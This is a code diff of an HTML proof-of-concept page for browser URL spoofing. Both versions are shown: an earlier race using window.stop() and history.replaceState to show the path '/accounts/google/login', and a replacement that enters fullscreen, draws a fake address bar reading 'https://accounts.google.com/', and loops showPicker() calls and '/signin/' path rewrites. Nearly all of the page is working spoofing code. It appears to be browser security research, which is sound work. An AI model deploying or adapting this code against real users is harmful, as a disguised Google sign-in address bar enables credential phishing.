@@ -1,39 +1,62 @@
 <!doctype html>
 <html lang="en">
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC: Navigation Race + replaceState</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>PoC: Android Fullscreen Picker Race</title>
 <style>
-  body { font-family: system-ui, sans-serif; margin: 1rem; }
-  iframe { width: 100%; height: 70vh; border: 1px solid #ccc; }
-  code { background: #f4f4f4; padding: .1rem .3rem; border-radius: 4px; }
+  body { margin: 0; font-family: system-ui, sans-serif; background:#111; color:#fff; }
+  #fake { position: fixed; top: 0; left: 0; right: 0; height: 54px; background:#f1f3f4; color:#111; display:none; align-items:center; padding:0 10px; z-index:999999; }
+  #chip { flex:1; background:#fff; border:1px solid #ccc; border-radius:16px; padding:6px 10px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  #controls { position:fixed; bottom:10px; left:10px; right:10px; background:rgba(0,0,0,.6); padding:10px; border-radius:8px; z-index:999999; }
+  button { margin: 4px 0; width:100%; height:40px; }
+  #bg { width:100vw; height:100vh; object-fit:cover; opacity:.35; }
 </style>
-<h1>Navigation race test</h1>
-<p>This does not prove a vulnerability by itself. It checks whether URL display/state gets stale during rapid stop+history updates.</p>
-<label>Victim URL: <input id="victim" size="42" value="https://example.com"></label>
-<label>Spoof path: <input id="spoof" size="42" value="/accounts/google/login"></label>
-<button id="run">Run race</button>
-<pre id="log"></pre>
-<iframe id="f" sandbox="allow-scripts allow-same-origin"></iframe>
+<div id="fake"><div id="chip">https://accounts.google.com/</div></div>
+<img id="bg" src="https://picsum.photos/1200/2200" alt="bg">
+<div id="controls">
+  <button id="start">1) Enter fullscreen + start picker race</button>
+  <button id="stop">2) Stop race</button>
+  <select id="picker"><option>open</option><option>dismiss</option><option>repeat</option></select>
+  <div id="log"></div>
+</div>
 <script>
-const log = (m) => document.getElementById('log').textContent += m + "\n";
-document.getElementById('run').onclick = () => {
-  const victim = document.getElementById('victim').value;
-  const spoof = document.getElementById('spoof').value;
-  history.replaceState({}, '', '/start');
-  const f = document.getElementById('f');
-  f.src = victim;
-  log('navigate iframe -> ' + victim);
-  setTimeout(() => {
-    try {
-      window.stop();
-      history.replaceState({}, '', spoof);
-      log('window.stop() + history.replaceState(' + spoof + ')');
-      log('current top URL=' + location.href);
-    } catch (e) {
-      log('error=' + String(e));
-    }
-  }, 120);
-};
+const fake = document.getElementById('fake');
+const picker = document.getElementById('picker');
+const log = (m) => document.getElementById('log').textContent = m;
+let timer = null;
+let pickerOk = 0;
+let pickerErr = 0;
+
+async function launch() {
+  try {
+    await document.documentElement.requestFullscreen();
+    fake.style.display = 'flex';
+    let c = 0;
+    timer = setInterval(() => {
+      c++;
+      if (picker.showPicker) {
+        try {
+          picker.showPicker();
+          pickerOk++;
+        } catch (e) {
+          pickerErr++;
+        }
+      }
+      if (c % 4 === 0) {
+        history.replaceState({}, '', '/signin/' + c);
+      }
+      log('tick=' + c + ' fs=' + !!document.fullscreenElement + ' url=' + location.pathname + ' pickerOk=' + pickerOk + ' pickerErr=' + pickerErr);
+    }, 300);
+  } catch (e) {
+    log('fullscreen denied: ' + e);
+  }
+}
+
+document.getElementById('start').onclick = launch;
+document.getElementById('stop').onclick = () => { if (timer) clearInterval(timer); timer = null; };
+
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) fake.style.display = 'none';
+});
 </script>
 </html>
